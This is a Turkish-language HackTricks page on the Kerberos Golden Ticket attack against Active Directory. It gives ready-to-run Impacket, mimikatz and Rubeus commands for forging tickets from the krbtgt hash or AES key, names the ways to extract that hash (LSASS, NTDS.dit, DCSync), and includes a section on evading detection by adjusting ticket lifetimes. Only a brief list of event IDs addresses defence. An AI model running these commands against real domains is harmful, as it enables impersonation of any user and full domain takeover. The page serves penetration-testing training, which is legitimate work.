# Altın Bilet

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gönderin**.

</details>

## Altın bilet

Bir **Altın Bilet** saldırısı, **herhangi bir kullanıcıyı taklit eden meşru bir Bilet Verme Bileti (TGT) oluşturma** işlemidir ve bunun için **Active Directory (AD) krbtgt hesabının NTLM karmasının kullanılması** gerekmektedir. Bu teknik, taklit edilen kullanıcı olarak **alan içindeki herhangi bir hizmete veya makineye erişimi mümkün kılar** ve bu nedenle oldukça avantajlıdır. **krbtgt hesabının kimlik bilgileri otomatik olarak güncellenmez**.

krbtgt hesabının NTLM karmasını **edinmek için** çeşitli yöntemler kullanılabilir. Bu, **Etki Alanı Denetleyicisi (DC) içindeki herhangi bir Domain Controller (DC)'de bulunan Local Security Authority Subsystem Service (LSASS) sürecinden** veya **NT Directory Services (NTDS.dit) dosyasından** çıkarılabilir. Ayrıca, bu NTLM karmasını elde etmek için **DCsync saldırısı gerçekleştirmek** de başka bir stratejidir ve bunun için Mimikatz'deki **lsadump::dcsync modülü** veya Impacket'teki **secretsdump.py betiği** gibi araçlar kullanılabilir. Bu işlemleri gerçekleştirmek için genellikle **etki alanı yönetici ayrıcalıkları veya benzer bir erişim düzeyi gereklidir**.

NTLM karması bu amaç için uygun bir yöntem olsa da, işletme güvenliği nedenleriyle **Gelişmiş Şifreleme Standardı (AES) Kerberos anahtarları (AES128 ve AES256) kullanarak biletlerin sahteciliği yapılması şiddetle önerilir**.


{% code title="Linux'tan" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Windows'tan" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Altın bileti enjekte ettiğinizde**, paylaşılan dosyalara **(C$)** erişebilir ve hizmetleri ve WMI'ı çalıştırabilirsiniz, bu nedenle bir kabuk elde etmek için **psexec** veya **wmiexec** kullanabilirsiniz (winrm üzerinden kabuk alamazsınız gibi görünüyor).

### Sık kullanılan tespitleri atlatma

Altın bileti tespit etmenin en yaygın yolları, **Kerberos trafiğini** incelemektir. Varsayılan olarak, Mimikatz, TGT'yi **10 yıl için imzalar**, bu da onunla yapılan sonraki TGS isteklerinde anormal olarak öne çıkar.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Başlangıç ofsetini, süreyi ve maksimum yenilemeleri (hepsi dakika cinsinden) kontrol etmek için `/startoffset`, `/endin` ve `/renewmax` parametrelerini kullanın.
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Maalesef, TGT'nin ömrü 4769'da kaydedilmez, bu yüzden bu bilgiyi Windows olay günlüklerinde bulamazsınız. Bununla birlikte, **bir önceki 4768 olmadan 4769 görmeniz** mümkündür. Bir TGS talep etmek TGT olmadan mümkün değildir ve bir TGT'nin verildiğine dair bir kayıt olmadığı durumda, bunun çevrimdışı olarak sahte olduğunu çıkarabiliriz.

Bu tespiti **atlamak için** elmas biletleri kontrol edin:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Hafifletme

* 4624: Hesap Oturumu
* 4672: Yönetici Oturumu
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Savunucuların yapabileceği diğer küçük hileler, varsayılan etki alanı yönetici hesabı gibi **duyarlı kullanıcılar için 4769'a alarm vermek**.

## Referanslar
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
